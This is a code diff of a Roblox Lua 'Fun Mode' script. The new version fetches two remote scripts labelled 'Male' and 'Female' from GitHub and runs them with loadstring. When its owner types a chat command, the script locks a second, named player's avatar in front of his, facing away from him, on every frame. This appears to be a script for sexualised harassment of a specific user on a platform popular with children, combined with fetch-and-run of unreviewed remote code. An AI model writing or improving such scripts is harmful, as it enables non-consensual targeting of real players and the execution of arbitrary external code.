@@ -1,129 +1,105 @@
--- SERVICES
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
 local StarterGui = game:GetService("StarterGui")
-
--- REMOTE EVENTS
-local RemoteEvent = ReplicatedStorage:FindFirstChild("FunEvent")
-if not RemoteEvent then
-    RemoteEvent = Instance.new("RemoteEvent")
-    RemoteEvent.Name = "FunEvent"
-    RemoteEvent.Parent = ReplicatedStorage
-end
-
--- SETTINGS
-local COMMAND_OWNER = "B6O6S"
-local FOLLOW_TARGET = "Nylas91"
 
 local MALE_URL = "https://raw.githubusercontent.com/B6O6S/Fun-mode/refs/heads/main/Male"
 local FEMALE_URL = "https://raw.githubusercontent.com/B6O6S/Fun-mode/refs/heads/main/Female"
 
-local following = false
-local originalPositions = {} -- store original positions for /re
+local FOLLOW_TARGET_NAME = "Nylas91"
+local COMMAND_OWNER = "B6O6S"
 
--- SEND SCRIPT TO CLIENT
-local function sendScript(player, url)
-    RemoteEvent:FireClient(player, url)
-    -- Optional notification
-    pcall(function()
-        StarterGui:SetCore("SendNotification", {
-            Title = "Fun Mode",
-            Text = "Script loaded successfully!",
-            Duration = 4
-        })
+local following = false
+
+-- Load script + notify
+local function loadScript(player, url)
+    local success = pcall(function()
+        loadstring(game:HttpGet(url))()
     end)
+
+    if success then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "Fun Mode",
+                Text = "Script loaded successfully!",
+                Duration = 4
+            })
+        end)
+    else
+        warn("Failed to load script for", player.Name)
+    end
 end
 
--- APPLY FUN (ONLY B6O6S)
+-- Apply fun (ONLY B6O6S can do this)
 local function applyFun()
     local b6o6s = Players:FindFirstChild(COMMAND_OWNER)
-    local nylas = Players:FindFirstChild(FOLLOW_TARGET)
+    local nylas = Players:FindFirstChild(FOLLOW_TARGET_NAME)
+
     if not b6o6s then return end
 
-    -- Store original positions
-    if b6o6s.Character and b6o6s.Character.PrimaryPart then
-        originalPositions[COMMAND_OWNER] = b6o6s.Character.PrimaryPart.CFrame
-    end
-    if nylas and nylas.Character and nylas.Character.PrimaryPart then
-        originalPositions[FOLLOW_TARGET] = nylas.Character.PrimaryPart.CFrame
-    end
+    -- B6O6S gets BOTH scripts
+    loadScript(b6o6s, MALE_URL)
+    loadScript(b6o6s, FEMALE_URL)
 
-    -- Trigger scripts on clients
-    sendScript(b6o6s, MALE_URL)
-    sendScript(b6o6s, FEMALE_URL)
+    -- Nylas gets female + locked
     if nylas then
-        sendScript(nylas, FEMALE_URL)
+        loadScript(nylas, FEMALE_URL)
         following = true
     end
 end
 
--- STOP FOLLOW
+-- Stop everything
 local function stopFun()
     following = false
 end
 
--- FULL RESET (BOTH PLAYERS)
+-- Reset everything
 local function resetAll()
     following = false
+
     local b6o6s = Players:FindFirstChild(COMMAND_OWNER)
-    local nylas = Players:FindFirstChild(FOLLOW_TARGET)
-
-    if b6o6s and originalPositions[COMMAND_OWNER] then
-        if b6o6s.Character and b6o6s.Character.PrimaryPart then
-            b6o6s.Character.PrimaryPart.CFrame = originalPositions[COMMAND_OWNER]
-        end
-    end
-
-    if nylas and originalPositions[FOLLOW_TARGET] then
-        if nylas.Character and nylas.Character.PrimaryPart then
-            nylas.Character.PrimaryPart.CFrame = originalPositions[FOLLOW_TARGET]
-        end
-    end
+    local nylas = Players:FindFirstChild(FOLLOW_TARGET_NAME)
 
     if b6o6s then b6o6s:LoadCharacter() end
     if nylas then nylas:LoadCharacter() end
 end
 
--- COMMAND HANDLER
-local function handleCommand(player, text)
-    text = text:lower()
-    if player.Name ~= COMMAND_OWNER then return end
+-- Chat listener
+local function onChat(player, msg)
+    msg = msg:lower()
 
-    if text == "/fun" then
+    -- ONLY B6O6S CAN CONTROL
+    if player.Name ~= COMMAND_OWNER then
+        return
+    end
+
+    if msg == "!fun" then
         applyFun()
-    elseif text == "/unfun" then
+    elseif msg == "!unfun" then
         stopFun()
-    elseif text == "/re" then
+    elseif msg == "!re" then
         resetAll()
     end
 end
 
--- CHAT SETUP (NEW ROBLOX CHAT)
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-    TextChatService.OnIncomingMessage = function(message)
-        local player = Players:GetPlayerByUserId(message.TextSource.UserId)
-        if player then
-            handleCommand(player, message.Text)
-        end
-        return TextChatService.CreateMessage()
-    end
-else
-    -- OLD CHAT FALLBACK
-    Players.PlayerAdded:Connect(function(player)
-        player.Chatted:Connect(function(msg)
-            handleCommand(player, msg)
-        end)
+-- Setup players
+local function setup(player)
+    player.Chatted:Connect(function(msg)
+        onChat(player, msg)
     end)
 end
 
--- FOLLOW LOOP (AUTO-RELOCK, BACK TOWARD B6O6S, 1.5 STUDS AWAY)
+for _, p in ipairs(Players:GetPlayers()) do
+    setup(p)
+end
+Players.PlayerAdded:Connect(setup)
+
+-- Lock Nylas in front of B6O6S with back facing him, 1.7 studs away
 RunService.Heartbeat:Connect(function()
     if not following then return end
 
     local b6o6s = Players:FindFirstChild(COMMAND_OWNER)
-    local nylas = Players:FindFirstChild(FOLLOW_TARGET)
+    local nylas = Players:FindFirstChild(FOLLOW_TARGET_NAME)
+
     if not (b6o6s and nylas) then return end
     if not (b6o6s.Character and nylas.Character) then return end
     if not (b6o6s.Character.PrimaryPart and nylas.Character.PrimaryPart) then return end
@@ -131,7 +107,9 @@ RunService.Heartbeat:Connect(function()
     local bHRP = b6o6s.Character.PrimaryPart
     local nHRP = nylas.Character.PrimaryPart
 
-    -- 1.5 studs in front, back toward B6O6S
-    local pos = bHRP.CFrame * CFrame.new(0, 0, -1.5)
-    nHRP.CFrame = CFrame.new(pos.Position, pos.Position + bHRP.CFrame.LookVector)
+    -- Position 1.7 studs in front of B6O6S
+    local front = bHRP.CFrame * CFrame.new(0, 0, -1.7)
+
+    -- Make Nylas face the SAME direction as B6O6S (so her back faces him)
+    nHRP.CFrame = CFrame.new(front.Position, front.Position + bHRP.CFrame.LookVector)
 end)
